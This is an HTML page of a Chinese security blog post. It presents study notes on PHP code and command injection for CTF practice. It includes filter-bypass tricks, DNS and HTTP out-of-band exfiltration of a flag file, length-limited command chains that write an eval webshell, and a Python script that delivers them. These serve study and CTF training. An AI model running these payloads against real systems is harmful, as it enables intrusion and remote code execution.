@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>安全牛代码/命令执行学习笔记 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="安全牛代码/命令执行学习笔记" />
+<meta property="og:description" content="0x00 代码执行相关函数 菜刀不支持php7。 eval(string code_str)把字符串作为PHP代码执行，Code_str是PHP代码字符串。 assert ($assertion [, string $description ] ) 检查" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-03-23T14:48:00+00:00" />
+<meta property="article:modified_time" content="2021-03-23T14:48:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="安全牛代码/命令执行学习笔记"/>
+<meta name="twitter:description" content="0x00 代码执行相关函数 菜刀不支持php7。 eval(string code_str)把字符串作为PHP代码执行，Code_str是PHP代码字符串。 assert ($assertion [, string $description ] ) 检查"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/" /><link rel="next" href="https://hannibal0x.github.io/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "安全牛代码/命令执行学习笔记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  4066 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/","datePublished": "2021-03-23T14:48:00+00:00","dateModified": "2021-03-23T14:48:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">安全牛代码/命令执行学习笔记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-03-23">2021-03-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4066 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-代码执行相关函数">0x00 代码执行相关函数</a></li>
+    <li><a href="#0x01-命令执行相关函数及各类命令执行绕过技巧">0x01 命令执行相关函数及各类命令执行绕过技巧</a></li>
+    <li><a href="#0x02-命令执行无回显的判断方法">0x02 命令执行无回显的判断方法</a></li>
+    <li><a href="#0x03-可控字符串长度受限情况下getshell">0x03 可控字符串长度受限情况下Getshell</a>
+      <ul>
+        <li><a href="#15个字符"><strong>15个字符</strong></a></li>
+        <li><a href="#7个字符">7个字符</a></li>
+        <li><a href="#5个字符"><strong>5个字符</strong></a></li>
+        <li><a href="#4个字符">4个字符</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-无数字字母的命令执行">0x04 无数字字母的命令执行</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-代码执行相关函数">0x00 代码执行相关函数</h2>
+<p>菜刀不支持php7。</p>
+<p><code>eval(string code_str)</code>把字符串作为PHP代码执行，Code_str是PHP代码字符串。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="396" height="141" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-114.png" alt="" class="wp-image-2668" /> </figure></p>
+<p><code>assert ($assertion [, string $description ] )</code> 检查一个断言是否为FALSE，assertion是字符串，它将会被当做PHP代码来执行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="781" height="368" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-113.png" alt="" class="wp-image-2667" /> </figure></p>
+<p><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</code>callback是将被调用的回调函数，parameter是0个或以上的参数，被传入回调函数。可以传递任何内置的或者用户自定义的函数，除了语言结构如array()，echo()，empty()，eval()，exit()，isset()，list()，print() 和 unset()。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="586" height="214" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-115.png" alt="" class="wp-image-2672" /> </figure></p>
+<p><code>call_user_func_array ( callable $callback , array $param_arr )</code>callback被调用的回调函数，param_arr要被传入回调函数的数组。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="441" height="170" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-117.png" alt="" class="wp-image-2675" /> </figure></p>
+<p><code>create_function ( string $args , string $code )</code>创建一个匿名（lambda 风格）函数，args是要创建的函数的参数，code是函数内的代码。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="683" height="315" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-118.png" alt="" class="wp-image-2676" /> </figure></p>
+<p><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>执行一个正则表达式的搜索和替换。<code>/e</code> 修正符使 preg_replace将 replacement 参数当做 PHP 代码【在适当的逆向引用和替换完之后】只有匹配上了才会执行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="760" height="80" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-121.png" alt="" class="wp-image-2680" /></figure></p>
+<p><code>array_map ( callable $callback , array $array1 [, array $... ] )</code>为数组的每个元素应用回调函数<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="404" height="184" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-122.png" alt="" class="wp-image-2684" /> </figure></p>
+<p>范例：url?a=assert&amp;b=phpinfo()</p>
+<p>如果注释掉$array[0]=$b，修改$array=$b，范例应为url?a=assert&amp;b[]=phpinfo()</p>
+<p><code>usort ( array &amp;$array , callable $value_compare_func )</code>使用用户自定义的比较函数对数组中的值进行排序。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="414" height="195" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-123.png" alt="" class="wp-image-2689" /> </figure></p>
+<p>注释的范例：url?1[]=phpinfo()&amp;1[]=，需要转两个参数比较，执行的命令必须放在第一位。</p>
+<p><code>uasort ( array &amp;$array , callable $value_compare_func )</code>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="606" height="143" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-124.png" alt="" class="wp-image-2693" /> </figure></p>
+<p>范例：url?pass=phpinfo()</p>
+<p><code>${php代码}</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="394" height="135" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-125.png" alt="" class="wp-image-2695" /> </figure></p>
+<h2 id="0x01-命令执行相关函数及各类命令执行绕过技巧">0x01 命令执行相关函数及各类命令执行绕过技巧</h2>
+<p><code>system(string command, int &amp;return_var)</code>可以用来执行系统命令并将相应的执行结果输出。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="552" height="166" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-126.png" alt="" class="wp-image-2697" /> </figure></p>
+<p><code>exec (string command, array &amp;output, int &amp;return_var)</code>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。<br>
+命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。<br>
+如果想要获取命令的输出内容， 请确保使用 output 参数。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="870" height="218" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-127.png" alt="" class="wp-image-2698" /> </figure></p>
+<p><code>passthru (string command, int &amp;return_var)</code>command是要执行的命令，return_var存放执行命令后的状态值。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="491" height="133" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-128.png" alt="" class="wp-image-2699" /> </figure></p>
+<p><code>shell_exec (string command)</code>command是要执行的命令。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="551" height="129" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-129.png" alt="" class="wp-image-2700" /> </figure></p>
+<p><code>``</code>运算符，与shell_exec功能相同，执行shell命令并返回输出的字符串。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="436" height="159" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-130.png" alt="" class="wp-image-2701" /> </figure></p>
+<p><code>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</code>打开输出控制缓冲。范例：url?a=ls，注意php7中无效。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="383" height="185" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-131.png" alt="" class="wp-image-2703" /> </figure></p>
+<p>命令执行的分隔符：</p>
+<pre class="wp-block-code"><code>换行符     %0a
+回车符     %0d
+连续指令   ;
+后台进程   &
+管道符     |
+(逻辑?)    ||  &&</code></pre>
+<p>命令执行的空格代替：</p>
+<pre class="wp-block-code"><code>&lt;符号
+$IFS
+${IFS}
+$IFS$9
+%09用于url传递</code></pre>
+<p>命令执行的绕过：</p>
+<pre class="wp-block-code"><code>a=l;b=s;$a$b
+
+`echo d2hvYW1p|base64 -d`base64编码</code></pre>
+<p>&ldquo;substr string pos len&quot;用法示例。该表达式是从string中取出从pos位置开始长度为len的子字符串。如果pos或len为非正整数时，将返回空字符串。一些用法范例：</p>
+<pre class="wp-block-code"><code>echo "${PATH:0:1}"
+echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
+echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`
+expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1</code></pre>
+<p>$(pwd)与pwd的区别在于更明确，$PWD是环境变量。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="759" height="217" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-132.png" alt="" class="wp-image-2710" /> </figure></p>
+<h2 id="0x02-命令执行无回显的判断方法">0x02 命令执行无回显的判断方法</h2>
+<p>命令无回显时的判断：延时（sleep time）、HTTP请求（curl ip:port+自己的服务器nc -lv port）、DNS请求（curl或ping域名+ceye等平台）。</p>
+<p>利用：写shell（直接写入/外部下载）、http/dns等方式带出数据。</p>
+<p>范例1：ping=`cat flag.txt|sed /[[:space:]]//`.xxx.ceye.io</p>
+<h2 id="0x03-可控字符串长度受限情况下getshell">0x03 可控字符串长度受限情况下Getshell</h2>
+<h3 id="15个字符"><strong>15个字符</strong></h3>
+<p><code>wget a.cn/1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span><code>mv 1 1.php</code></p>
+<p><code>echo \&lt;?php &gt;1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span><code>echo eval\(&gt;&gt;1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span><code>echo \$_GET&gt;&gt;1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span> <code>echo \[1\]&gt;&gt;1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span> <code>&lt;code&gt;echo \)\;&gt;&gt;1</code><span class="has-inline-color has-vivid-red-color">-&gt;</span> mv 1 1.php</code></p>
+<h3 id="7个字符">7个字符</h3>
+<p>预备知识，参考<a href="https://www.freesion.com/article/7875567520/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.freesion.com/article/7875567520/" target="_blank" rel="noopener noreffer ">https://www.freesion.com/article/7875567520/</a></a></p>
+<pre class="wp-block-code"><code>>a    #虽然没有输入但是会创建a这个文件
+ls -t    #ls基于基于事件排序（从晚到早）
+sh a    #sh会把a里面的每行内容当作命令来执行
+使用|进行命令拼接    #l\ s    =    ls
+base64    #使用base64编码避免特殊字符</code></pre>
+<p><code>&lt;?php eval($_GET[1]);</code>进行base64加密，需要被执行的语句：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
+<p>payload:</p>
+<pre class="wp-block-code"><code>>hp
+>1.p\\
+>d\>\\
+>\ -\\
+>e64\\
+>bas\\
+>7\|\\
+>XSk\\
+>Fsx\\
+>dFV\\
+>kX0\\
+>bCg\\
+>XZh\\
+>AgZ\\
+>waH\\
+>PD9\\
+>o\ \\
+>ech\\
+ls -t>0
+sh 0</code></pre>
+<p>脚本代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.61.157/rce.php?1=</span><span class="si">{0}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]start attack!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;payload.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]&#34;</span> <span class="o">+</span> <span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">		<span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#检查是否攻击成功</span>
+</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://192.168.61.157/1.php&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">test</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">requests</span><span class="o">.</span><span class="n">codes</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Attack success!!!&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5个字符"><strong>5个字符</strong></h3>
+<p>解决ls -t&gt;0，a在排序在l前符号后，可以使用下面的方法拆分。</p>
+<pre class="wp-block-code"><code>>ls\\
+ls>a
+>\ \\
+>-t\\
+>\>0
+ls>>a</code></pre>
+<p>参考：<a rel="noreferrer noopener" href="https://www.freesion.com/article/8743881775/" target="_blank" rel="nofollow" ><a href="https://www.freesion.com/article/8743881775/" target="_blank" rel="noopener noreffer ">https://www.freesion.com/article/8743881775/</a></a>、<a href="https://www.freesion.com/article/49311037498/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.freesion.com/article/49311037498/" target="_blank" rel="noopener noreffer ">https://www.freesion.com/article/49311037498/</a></a></p>
+<p>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p>
+<pre class="wp-block-code"><code>>id
+>root
+* （等同于命令：id root）</code></pre>
+<p>增加字母来限定被用来当作命令和参数的文件</p>
+<pre class="wp-block-code"><code>>ls
+>lss
+>lsss
+>1
+*s (等同于命令：ls lss lsss)
+*使第一个列出的文件名（ls）当作命令，剩下的文件名当作参数，而*后面的s有限制了只有含有s的字符串才能当做参数</code></pre><figure class="wp-block-image">
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png"
+        data-srcset="https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png, https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png 1.5x, https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png 2x"
+        data-sizes="auto"
+        alt="https://www.freesion.com/images/969/c9db6635dd9abcdf077f27576aef5e59.png"
+        title="在这里插入图片描述" /> </figure></p>
+<p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p>
+<pre class="wp-block-code"><code>>rev
+echo 1234 > v
+*v （等同于命令：rev v）</code></pre><figure class="wp-block-image">
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png"
+        data-srcset="https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png, https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png 1.5x, https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png 2x"
+        data-sizes="auto"
+        alt="https://www.freesion.com/images/163/0c566f59f77d40f4bcd7d55bd4976833.png"
+        title="在这里插入图片描述" /> </figure></p>
+<p>IFS来代替空格，有时候一条命令中可能要有多个空格，而这样的话用上面的方法拼接命令是就会生成相同名的文件（空格），会造成覆盖，所以要用‘{IFS}`等符号来代替一个空格。</p>
+<p>将创建的文件可以排成理想的顺序</p>
+<p><strong>思路1：(存在局限性，环境不一样，结果可能不一样，\长度只能算1)</strong></p>
+<pre class="wp-block-code"><code># ls ‐t>q
+>-t\\
+>\>q
+>l\\
+>s\ \\
+ls>a
+ls>>a</code></pre>
+<p>ls&gt;a之后文件内容为<figure class="wp-block-image"></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png"
+        data-srcset="https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png, https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png 1.5x, https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png 2x"
+        data-sizes="auto"
+        alt="https://www.freesion.com/images/385/ee52a107b1a0028e7883d34d156cb511.png"
+        title="在这里插入图片描述" /> </figure></p>
+<p>在ls&raquo;a 得到的结果为<figure class="wp-block-image"></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png"
+        data-srcset="https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png, https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png 1.5x, https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png 2x"
+        data-sizes="auto"
+        alt="https://www.freesion.com/images/191/b6c3bb8ddefff62d99609983f27284a7.png"
+        title="在这里插入图片描述" /> </figure></p>
+<p><strong>思路2：</strong></p>
+<p>用dir来代替ls不换行输出；rev将文件内容反向输出，目的是将<code>ls ‐th &gt;f</code>写入文件，-h选项的意思是生成的结果有利于人看，也就是不是用默认的byte做单位，而是根据实际情况调整。h的存在只为了能够利用字典顺序，即<code>f</code>在<code>ht-</code>前，<code>ht-</code>在<code>sl</code>前，这就按照字母顺序写入了v，v再反向输出一下就得到了ls ‐th &gt;f。</p>
+<pre class="wp-block-code"><code>>dir
+>f\>
+>ht-
+>sl
+
+*>v (等同于命令：dir "f>" "ht‐" "sl" > v ，先将反向命令的写入中间文件v，文件v中的内容为f> ht- sl （dir写入文件自动加空格，所以不需要在用“\”来转义空格了））
+>rev
+>*v>a (等同于命令：rev v > a)(a里面的内容为:ls ‐th >f)</code></pre>
+<p>后期再传入攻击payload或执行其他命令时，通过sh执行a文件即可生成f文件，得到的f文件里就是我们想要执行的命令或木马。反弹shell和上传Webshell马可参考链接。</p>
+<h3 id="4个字符">4个字符</h3>
+<p>思路与上面的相似。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&gt;dir
+</span></span><span class="line"><span class="cl">&gt;f\&gt;
+</span></span><span class="line"><span class="cl">&gt;ht-
+</span></span><span class="line"><span class="cl">&gt;sl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*&gt;v (等同于命令：dir &#34;f&gt;&#34; &#34;ht‐&#34; &#34;sl&#34; &gt; v ，先将反向命令的写入中间文件v，文件v中的内容为f&gt; ht- sl （dir写入文件自动加空格，所以不需要在用“\”来转义空格了））
+</span></span><span class="line"><span class="cl">&gt;rev
+</span></span><span class="line"><span class="cl">&gt;*v&gt;a (等同于命令：rev v &gt; a)(a里面的内容为:ls ‐th &gt;f)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-无数字字母的命令执行">0x04 无数字字母的命令执行</h2>
